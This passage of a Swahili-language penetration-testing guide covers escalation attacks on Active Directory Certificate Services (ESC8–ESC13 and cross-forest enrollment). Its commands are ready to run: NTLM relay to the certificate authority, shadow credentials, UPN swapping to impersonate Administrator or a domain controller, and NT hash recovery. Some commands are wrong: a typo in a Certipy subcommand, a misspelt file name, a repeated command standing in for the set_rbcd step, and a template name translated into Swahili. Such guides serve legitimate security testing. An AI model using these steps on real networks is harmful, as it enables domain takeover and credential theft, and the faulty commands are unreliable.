#### Matumizi Mabaya na Kuthibitisha
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Matumizi mabaya na [Certipy](https://github.com/ly4k/Certipy)

Ombi la cheti hufanywa na Certipy kwa msingi wa kigezo cha `Machine` au `User`, kulingana na ikiwa jina la akaunti linalotumika linamalizika kwa `$`. Ufafanuzi wa kigezo mbadala unaweza kufikiwa kupitia matumizi ya parameter `-template`.

Mbinu kama [PetitPotam](https://github.com/ly4k/PetitPotam) kisha inaweza kutumika kushawishi uwakiki. Wakati unashughulika na wadhibiti wa kikoa, ufafanuzi wa `-template DomainController` unahitajika.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Hakuna Kifaa cha Usalama - ESC9 <a href="#id-5485" id="id-5485"></a>

### Maelezo

Thamani mpya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) kwa **`msPKI-Enrollment-Flag`**, inayojulikana kama ESC9, inazuia uingizaji wa **mzizi mpya wa usalama wa `szOID_NTDS_CA_SECURITY_EXT`** kwenye cheti. Bendera hii inakuwa muhimu wakati `StrongCertificateBindingEnforcement` inawekwa kama `1` (chaguo msingi), ikilinganishwa na kuwekwa kama `2`. Umuhimu wake unakuwa mkubwa katika mazingira ambapo uwekaji dhaifu wa cheti kwa Kerberos au Schannel unaweza kutumiwa (kama katika ESC10), ikizingatiwa kwamba kutokuwepo kwa ESC9 usingebadilisha mahitaji.

Mazingira ambayo usanidi wa bendera hii unakuwa muhimu ni pamoja na:

- `StrongCertificateBindingEnforcement` haijaongezwa hadi `2` (ambapo chaguo msingi ni `1`), au `CertificateMappingMethods` inajumuisha bendera ya `UPN`.
- Cheti limeorodheshwa na bendera ya `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya usanidi wa `msPKI-Enrollment-Flag`.
- EKU yoyote ya uthibitishaji wa mteja imefafanuliwa na cheti.
- `GenericWrite` inapatikana juu ya akaunti yoyote kwa kusudi la kuhatarisha nyingine.

### Kesi ya Matumizi Mabaya

Fikiria `John@corp.local` ana ruhusa za `GenericWrite` juu ya `Jane@corp.local`, na lengo la kuhatarisha `Administrator@corp.local`. Kigezo cha cheti cha `ESC9`, ambacho `Jane@corp.local` ameruhusiwa kujiandikisha, kimeboreshwa na bendera ya `CT_FLAG_NO_SECURITY_EXTENSION` katika usanidi wake wa `msPKI-Enrollment-Flag`.

Kwa kuanzia, hash ya `Jane` inapata kutumia Vitambulisho vya Kivuli, shukrani kwa `GenericWrite` ya `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Baadaye, `Jane`'s `userPrincipalName` inabadilishwa kuwa `Administrator`, kwa makusudi ikikosa sehemu ya uwanja ya `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hii mabadiliko hayakiuki vikwazo, ikizingatiwa kuwa `Administrator@corp.local` inabaki tofauti kama `userPrincipalName` ya `Administrator`.

Kufuatia hili, kiolesura cha cheti cha `ESC9`, kilichobainishwa kuwa hatarini, kinahitajika kama `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Ni wazi kwamba `userPrincipalName` ya cheti inaonyesha `Administrator`, bila "object SID".

`userPrincipalName` ya `Jane` kisha irudishwa kwa yake ya awali, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kujaribu uthibitisho na cheti kilichotolewa sasa kunazalisha NT hash ya `Administrator@corp.local`. Amri lazima ijumuishe `-domain <domain>` kutokana na kutokuwepo kwa maelezo ya kikoa kwenye cheti:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mappingsi Dhaifu ya Cheti - ESC10

### Maelezo

Thamani mbili za funguo za usajili kwenye kisanduku cha kudhibiti kikoa zinahusishwa na ESC10:

* Thamani ya msingi ya `CertificateMappingMethods` chini ya `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ni `0x18` (`0x8 | 0x10`), hapo awali iliwekwa kama `0x1F`.
* Mipangilio ya msingi ya `StrongCertificateBindingEnforcement` chini ya `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ni `1`, hapo awali ilikuwa `0`.

**Kesi 1**

Wakati `StrongCertificateBindingEnforcement` inapowekwa kama `0`.

**Kesi 2**

Ikiwa `CertificateMappingMethods` inajumuisha biti ya `UPN` (`0x4`).

### Kesi ya Mabaya 1

Ukiwa na `StrongCertificateBindingEnforcement` ikiwekwa kama `0`, akaunti A yenye ruhusa za `GenericWrite` inaweza kutumiwa kudukua akaunti yoyote B.

Kwa mfano, ukiwa na ruhusa za `GenericWrite` juu ya `Jane@corp.local`, mkaidi ananuia kudukua `Administrator@corp.local`. Mchakato unafanana na ESC9, kuruhusu templeti yoyote ya cheti kutumika.

Kwanza, hash ya `Jane` inapata kutumia Vitambulisho vya Kivuli, kwa kutumia `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Baadaye, `userPrincipalName` ya `Jane` imebadilishwa kuwa `Administrator`, kwa makusudi kuepuka sehemu ya `@corp.local` ili kuepuka kukiuka kizuizi.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Kufuatia hili, cheti kinachowezesha uthibitishaji wa mteja kinahitajika kama `Jane`, ukitumia kigezo cha `Mtumiaji` cha msingi.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` kisha irudishwa kwenye hali yake ya awali, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kuhalalisha kwa cheti kilichopatikana kutatoa NT hash ya `Administrator@corp.local`, ikihitaji kutaja kikoa katika amri kutokana na kutokuwepo kwa maelezo ya kikoa kwenye cheti.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kesi ya Matumizi 2

Kwa `CertificateMappingMethods` inayo `UPN` bit flag (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza kuhatarisha akaunti yoyote B ambayo haina mali ya `userPrincipalName`, ikiwa ni pamoja na akaunti za mashine na msimamizi wa kujengwa wa uwanja `Administrator`.

Hapa, lengo ni kuhatarisha `DC$@corp.local`, kuanzia na kupata hash ya `Jane` kupitia Shadow Credentials, ikiboresha `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` ya `Jane` inawekwa kuwa `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Cheti cha uthibitishaji wa mteja kinahitajika kama `Jane` kwa kutumia kigezo cha `Mtumiaji` cha msingi.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` inarudishwa kwa hali yake ya awali baada ya mchakato huu.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Kutambulisha kupitia Schannel, chaguo la `-ldap-shell` la Certipy hutumiwa, ikionyesha mafanikio ya kutambulisha kama `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kupitia kabibi ya LDAP, amri kama vile `set_rbcd` huwezesha mashambulizi ya Uteuzi uliopunguzwa kwa Msingi wa Rasilmali (RBCD), hivyo kuhatarisha udhibiti wa kikoa.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Hii udhaifu pia unahusisha akaunti yoyote ya mtumiaji ambayo haina `userPrincipalName` au ambapo haifanani na `sAMAccountName`, na chaguo-msingi la `Administrator@corp.local` likiwa lengo kuu kutokana na mamlaka yake ya LDAP iliyoinuliwa na kutokuwepo kwa `userPrincipalName` kwa chaguo-msingi.

## Kusambaza NTLM kwa ICPR - ESC11

### Maelezo

Ikiwa Seva ya CA haijaundwa na `IF_ENFORCEENCRYPTICERTREQUEST`, inaweza kufanya mashambulizi ya kusambaza NTLM bila kusaini kupitia huduma ya RPC. [Marejeleo hapa](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Unaweza kutumia `certipy` kutambua ikiwa `Enforce Encryption for Requests` imelemazwa na certipy itaonyesha Udhaifu wa `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Skenario la Mabaya

Inahitaji kuweka seva ya kuhamisha:
``` bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
**Kumbuka: Kwa watumiaji wa kudhibiti uwanja, lazima tueleze `-template` katika DomainController.**

Au kutumia [fork ya sploutchy ya impacket](https://github.com/sploutchy/impacket):
``` bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Upatikanaji wa Shell kwa ADCS CA na YubiHSM - ESC12

### Maelezo

Waadiministrata wanaweza kuweka Mamlaka ya Cheti kuihifadhi kwenye kifaa cha nje kama "Yubico YubiHSM2".

Ikiwa kifaa cha USB kimeunganishwa kwenye seva ya CA kupitia bandari ya USB, au seva ya kifaa cha USB katika kesi ambapo seva ya CA ni mashine halisi, ufunguo wa uthibitishaji (mara nyingine huitwa "nywila") unahitajika kwa Mtoaji wa Uhifadhi wa Ufunguo ili kuzalisha na kutumia funguo kwenye YubiHSM.

Ufunguo/nywila hii imehifadhiwa kwenye usajili chini ya `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` kwa maandishi wazi.

Rejea [hapa](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Skena ya Mabaya

Ikiwa funguo binafsi ya CA imehifadhiwa kwenye kifaa cha USB halisi unapopata upatikanaji wa shell, ni rahisi kupata funguo hilo.

Kwanza, unahitaji kupata cheti cha CA (hiki ni cha umma) na kisha:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
## Kufikia hatimaye, tumia amri ya `-sign` ya certutil kuzua cheti kipya cha kubahatisha kwa kutumia cheti cha CA na ufunguo wake wa kibinafsi.


## Uvunjaji wa Kundi la OID Link - ESC13

### Maelezo

Sifa ya `msPKI-Certificate-Policy` inaruhusu sera ya utoaji iweze kuongezwa kwenye kigezo cha cheti. Vitu vya `msPKI-Enterprise-Oid` vinavyohusika na sera za utoaji zinaweza kupatikana katika Muktadha wa Kutaja Usanidi (CN=OID,CN=Public Key Services,CN=Services) ya chombo cha PKI OID. Sera inaweza kuunganishwa na kikundi cha AD kwa kutumia sifa ya `msDS-OIDToGroupLink` ya kipengee hiki, ikiruhusu mfumo kuidhinisha mtumiaji ambaye anawasilisha cheti kana kwamba yeye ni mwanachama wa kikundi hicho. [Marejeleo hapa](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Kwa maneno mengine, wakati mtumiaji ana idhini ya kujiandikisha kwa cheti na cheti kimeunganishwa na kundi la OID, mtumiaji anaweza kurithi mamlaka ya kikundi hiki.

Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kwa ajili ya kutafuta OIDToGroupLink:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Skenario la Mabaya

Pata idhini ya mtumiaji inayoweza kutumia `certipy find` au `Certify.exe find /showAllPermissions`.

Ikiwa `John` ana idhini ya kujiandikisha kwa `VulnerableTemplate`, mtumiaji anaweza kurithi mamlaka ya kikundi cha `VulnerableGroup`.

Yote inayohitajika kufanya ni kutaja kiolezo, atapata cheti chenye haki za OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Kuvunja Misitu na Vyeti Vilivyoelezewa kwa Kisarufi

### Kuvunja Uaminifu wa Misitu kwa Kutumia CAs Zilizodhuriwa

Usanidi wa **usajili wa msitu-mchanganyiko** unafanywa kuwa wa moja kwa moja. **Cheti cha CA cha msingi** kutoka kwa msitu wa rasilimali **huchapishwa kwa misitu ya akaunti** na **vyeti vya CA vya kampuni** kutoka kwa msitu wa rasilimali **huongezwa kwenye kontena za `NTAuthCertificates` na AIA katika kila msitu wa akaunti**. Ili kufafanua, makubaliano haya yanatoa **udhibiti kamili kwa CA katika msitu wa rasilimali** juu ya misitu mingine yote ambayo inasimamia PKI. Ikiwa CA hii itakuwa **imedorora na wachomaji**, vyeti vya watumiaji wote katika misitu ya rasilimali na akaunti yanaweza **kughushiwa na wao**, hivyo kuvunja kizuizi cha usalama wa msitu.

### Haki za Usajili Zilizotolewa kwa Mawakala wa Kigeni

Katika mazingira ya misitu mingi, tahadhari inahitajika kuhusu CAs za Kampuni ambazo **huchapisha templeti za vyeti** ambazo huruhusu **Watumiaji Waliothibitishwa au mawakala wa kigeni** (watumiaji/vikundi vya nje ya msitu ambao CA ya Kampuni inahusiana nao) **haki za usajili na kuhariri**.\
Baada ya uthibitisho kupitia uaminifu, **SID ya Watumiaji Waliothibitishwa** inaongezwa kwa token ya mtumiaji na AD. Hivyo, ikiwa kikoa kina CA ya Kampuni na templeti inayoruhusu **haki za usajili kwa Watumiaji Waliothibitishwa**, templeti inaweza kwa uwezekano **kusajiliwa na mtumiaji kutoka msitu tofauti**. Vivyo hivyo, ikiwa **haki za usajili zinatolewa wazi kwa mawakala wa kigeni kupitia templeti**, **uhusiano wa kudhibiti-ufikiaji wa msitu-mchanganyiko unatengenezwa**, kuruhusu mawakala kutoka msitu mmoja **kusajili katika templeti kutoka msitu mwingine**.

Mazingira yote mawili husababisha **ongezeko la eneo la shambulio** kutoka msitu mmoja hadi mwingine. Mipangilio ya templeti ya cheti inaweza kutumiwa na mshambuliaji kupata mamlaka zaidi katika kikoa cha kigeni.
